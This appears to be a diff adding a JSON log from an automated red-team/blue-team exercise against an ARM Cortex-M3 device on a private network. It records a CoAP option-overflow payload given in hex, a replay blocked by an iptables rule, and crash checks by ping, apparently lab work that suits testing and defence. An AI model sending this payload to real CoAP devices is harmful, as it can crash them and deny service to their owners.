@@ -1,0 +1,110 @@
+[
+  {
+    "timestamp": 1771506636.9817672,
+    "target_ip": "192.168.100.35",
+    "target_arch": "ARM Cortex-M3",
+    "tool_used": "coap_option_overflow",
+    "payload_hex": "40011337ddffff",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "response_hex": "",
+      "response_len": 0,
+      "details": "No UDP response (device may have dropped packet)",
+      "attack": "coap_option_overflow",
+      "payload_hex": "40011337ddffff"
+    }
+  },
+  {
+    "timestamp": 1771506641.99262,
+    "target_ip": "192.168.100.35",
+    "target_arch": "ARM Cortex-M3",
+    "tool_used": "replay_coap_option_overflow",
+    "payload_hex": "40011337ddffff",
+    "packets_sent": 1,
+    "outcome": "blocked_by_patch",
+    "details": {
+      "sent": true,
+      "got_reply": false,
+      "payload_hex": "40011337ddffff"
+    }
+  },
+  {
+    "timestamp": 1771506641.9933286,
+    "target_ip": "192.168.100.35",
+    "target_arch": "ARM Cortex-M3",
+    "tool_used": "blue_verify_patch",
+    "payload_hex": "",
+    "packets_sent": 0,
+    "outcome": "patch_verified",
+    "details": {
+      "rule": "iptables -A FORWARD -p udp --dport 5683 -m length --length 0:7 -j DROP"
+    }
+  },
+  {
+    "timestamp": 1771509313.2206268,
+    "target_ip": "192.168.100.35",
+    "target_arch": "Unknown",
+    "tool_used": "coap_option_overflow",
+    "payload_hex": "40011337ddffff",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "response_hex": "",
+      "response_len": 0,
+      "details": "No UDP response (device may have dropped packet)",
+      "attack": "coap_option_overflow",
+      "payload_hex": "40011337ddffff"
+    }
+  },
+  {
+    "timestamp": 1771509319.9736216,
+    "target_ip": "192.168.100.35",
+    "target_arch": "Unknown",
+    "tool_used": "verify_crash",
+    "payload_hex": "",
+    "packets_sent": 2,
+    "outcome": "crash_verified",
+    "details": {
+      "status": "crashed",
+      "verified": true,
+      "ip": "192.168.100.35",
+      "details": "ICMP ping failed",
+      "vulnerability_id": "11ecfbc165ba"
+    }
+  },
+  {
+    "timestamp": 1771509572.3071537,
+    "target_ip": "192.168.100.35",
+    "target_arch": "ARM Cortex-M3",
+    "tool_used": "coap_option_overflow",
+    "payload_hex": "40011337ddffff",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "response_hex": "",
+      "response_len": 0,
+      "details": "No UDP response (device may have dropped packet)",
+      "attack": "coap_option_overflow",
+      "payload_hex": "40011337ddffff"
+    }
+  },
+  {
+    "timestamp": 1771509580.57908,
+    "target_ip": "192.168.100.35",
+    "target_arch": "ARM Cortex-M3",
+    "tool_used": "verify_crash",
+    "payload_hex": "",
+    "packets_sent": 2,
+    "outcome": "alive",
+    "details": {
+      "status": "alive",
+      "verified": false,
+      "ip": "192.168.100.35",
+      "details": "UDP CoAP probe got response on port 5683"
+    }
+  }
+]
